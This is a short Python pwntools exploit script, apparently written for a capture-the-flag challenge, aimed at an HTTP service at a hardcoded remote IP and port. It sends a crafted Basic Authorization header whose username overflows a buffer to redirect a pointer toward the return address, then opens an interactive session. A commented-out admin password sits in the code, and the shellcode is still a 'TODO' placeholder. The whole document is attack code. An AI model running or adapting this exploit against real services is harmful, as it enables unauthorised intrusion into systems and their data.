#!/usr/bin/env python3
import struct

from pwn import *

BASEDIR = os.path.dirname(__file__)


def connect():
    if args.LOCAL:
        return remote("172.17.0.3", 9999)
    else:
        return remote("111.186.59.27", 28088)


SHELLCODE = b"TODO"


def main():
    with connect() as tube:
        tube.send("GET / HTTP/1.1\r\n")
        # username = "admin"
        # password = "70p_s3cr37_!@#"
        username_buf_addr = 0x400080fa80
        # username_buf_addr_addr = 0x400080fac8
        password_buf_addr = 0x400080fa50
        password_buf_addr_addr = 0x400080fac0
        retaddr_addr = 0x400080fb10
        orig_val = struct.pack("<Q", password_buf_addr)
        new_val = struct.pack("<Q", retaddr_addr)
        suffix_len = 5
        assert orig_val[-suffix_len:] == new_val[-suffix_len:]
        username = flat({
            password_buf_addr_addr - username_buf_addr: new_val[:-suffix_len],
        })
        print(str(len(username)))
        print(username)
        assert b"\x00" not in username
        assert b":" not in username
        password = b"AAAAAAAA"
        print(str(len(password)))
        print(password)
        assert b"\x00" not in password
        assert b":" not in password
        auth = base64.b64encode(username + b":" + password).decode()
        tube.send(f"Authorization: Basic {auth}\r\n")
        tube.send("\r\n")
        tube.interactive()


if __name__ == "__main__":
    main()
